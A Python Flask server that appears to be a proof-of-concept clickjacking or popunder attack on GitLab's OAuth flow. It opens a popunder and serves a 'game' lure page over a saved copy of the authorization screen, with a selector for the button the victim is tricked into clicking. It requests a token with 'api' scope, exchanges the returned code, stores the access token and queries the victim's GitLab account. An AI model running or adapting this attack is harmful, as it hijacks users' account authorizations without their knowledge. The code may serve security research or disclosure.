#!/usr/bin/env python3
from glob import glob
from flask import Flask, jsonify, redirect, render_template, session, url_for, request
import requests
import os

CLIENT_ID = "..."
CLIENT_SECRET = "gloas-..."
REDIRECT_URI = "http://localhost:8000/callback"

GOOGLE_CLIENT_ID = "465150997505-j3lj5fpbdddjomrd9omtjhjkg3pfor3l.apps.googleusercontent.com"
POPUP_SIZE = [1000, 440]
# BUTTON_OFFSET = {"pos": [250, 281], "size": [172, 32]}
BUTTON_SELECTOR = 'button[data-testid="authorization-button"]'
USE_HISTORY_BACK = True

app = Flask(__name__)
app.secret_key = os.urandom(24)


# Look for saved target as HTML to use with BUTTON_SELECTOR
if button := globals().get("BUTTON_OFFSET") is None:
    saved_target_path = os.path.join(app.root_path, "static", "saved-target")
    if not (saved_target := glob(os.path.join(saved_target_path, "*.html"))):
        raise FileNotFoundError(
            f"No file found at {os.path.join(saved_target_path, '*.html')}")
    if not glob(os.path.join(saved_target_path, "*_files")):
        raise FileNotFoundError(
            f"No directory found at {os.path.join(saved_target_path, '*_files')}")

    button = {"url": "/" + os.path.relpath(saved_target[0], app.root_path),
              "selector": globals().get("BUTTON_SELECTOR")}
    print("Found saved target:", button)
    assert button['selector'], "BUTTON_SELECTOR not found, please set it to the selector of the button you want to click"


@app.route("/")
def index():
    print(session)
    # 4. Upon reload, get token from session
    if session.get("access_token"):
        access_token = session.get("access_token")

        r = requests.get("https://gitlab.com/api/v4/user", headers={
            "Authorization": f"Bearer {access_token}"
        })

        return jsonify(r.json())

    # 1. Create popunder
    domain = request.host.split(":")[0]
    return render_template("index.html", google_client_id=GOOGLE_CLIENT_ID, domain=domain)


@app.route("/game")
def game():
    # 2. Prepare oauth url to send to callback
    url = f"https://gitlab.com/oauth/authorize?client_id=28810f33d312448f32a2d01548635f40efc02780180bacd6b48c0d69197ed03e&redirect_uri=https%3A%2F%2Fvercel.com%2Fapi%2Fnow%2Fregistration%2Fgitlab%2Fcallback&response_type=code&scope=api&state=717b6dd03033f5fcd59aa2654db96b493a4c6b893e15181e27afef604312909269be41e0da1e4a113113786ae67e8e8a7e60f673a614a7240b762c46ebf504c744406295b7632371b09ace448539c1309f87ab9c5be532db40859764845b315fa18c00a138179263ec284e5fea7f250cc843753fa387c70b585b4053382b5215b88ec3d0ccde46084705e0f2f20241805c579994ff57fa850917dac69f9d9c8e7a826a353afd76906303fac52ce7ad7bc14bcc"

    return render_template("game.html", url=url, button=button, popup_size=POPUP_SIZE, use_history_back=USE_HISTORY_BACK)


@app.route("/clear")
def clear():
    session.clear()
    return redirect(url_for("index"))


@app.route("/callback")
def callback():
    # 3. Receive callback and exchange code for token
    print(request.args)
    code = request.args.get("code")

    r = requests.post("https://gitlab.com/oauth/token", data={
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "code": code,
        "grant_type": "authorization_code",
        "redirect_uri": REDIRECT_URI
    })
    json = r.json()
    print(json)
    session["access_token"] = json.get("access_token")

    return '<script>window.close()</script>'


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=8000)
